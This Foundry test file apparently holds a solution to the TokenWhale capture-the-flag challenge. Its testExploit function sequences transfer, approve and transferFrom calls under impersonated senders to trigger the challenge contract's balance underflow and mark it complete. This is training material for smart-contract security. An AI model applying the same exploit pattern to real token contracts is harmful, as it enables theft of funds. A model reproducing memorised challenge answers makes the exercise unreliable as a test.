// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/TokenWhale.sol";

contract TokenWhaleTest is Test {
    TokenWhale public tokenWhale;
    ExploitContract public exploitContract;
    // Feel free to use these random addresses
    address public immutable Alice = makeAddr("Alice");
    address public immutable Bob = makeAddr("Bob");
    function setUp() public {
        // Deploy contracts
        tokenWhale = new TokenWhale(Alice);
        exploitContract = new ExploitContract(tokenWhale);
    }

    // Use the instance tokenWhale and exploitContract
    // Use vm.startPrank and vm.stopPrank to change between msg.sender
    function testExploit() public {
        // Put your solution here
        vm.prank(Alice);
        tokenWhale.transfer(Bob, 510);
        vm.prank(Bob);
        tokenWhale.approve(Alice, 1000);
        vm.prank(Alice);
        tokenWhale.transferFrom(Bob, Bob, 500);
        assertEq(tokenWhale.isComplete(), true);
        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(tokenWhale.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
